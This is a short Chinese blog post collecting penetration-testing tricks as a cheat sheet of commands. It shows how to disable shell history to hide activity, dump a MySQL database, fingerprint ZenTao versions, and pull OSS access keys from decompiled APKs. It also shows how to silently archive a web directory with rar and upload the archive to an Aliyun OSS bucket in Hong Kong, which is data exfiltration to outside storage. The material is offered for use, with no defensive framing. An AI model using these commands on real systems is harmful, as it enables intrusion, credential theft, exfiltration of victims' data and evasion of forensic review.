---
title: "分享渗透中的小技巧"
---

巩固知识，以免忘记
<!--more-->

<h5>关闭.History</h5>

```
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
```

<h5>mysql dump脱数据<h5>

```mysql
mysqldump -hdbhost -uroot -pdbpasswd -d dbname >db.sql;
```


<h5>fofa使用中文关键字搜索目标搜不到</h5>
使用html编码后再搜索  https://seo.juziseo.com/tools/entity/

<h5>禅道获取版本号</h5>

index.php?mode=getconfig

<h5>获取oss key</h5>

apk逆向得到class文件，全局搜索OSS_access

<h5>获取进程中文件的具体位置</h5>

```
wmic process where name="qq.exe" get processid,executablepath,name
```

<h5>rar.exe压缩</h5>

```
rar.exe a -ag -k -r -s -ibck c:/programdata/wwww.rar  E:/web
```

<h5>oss传输文件</h5>

```
oss.exe cp c:\programdata\db.rar oss://xxx/xxx -e oss-cn-hongkong.aliyuncs.com -i xxx -k xxxx
```
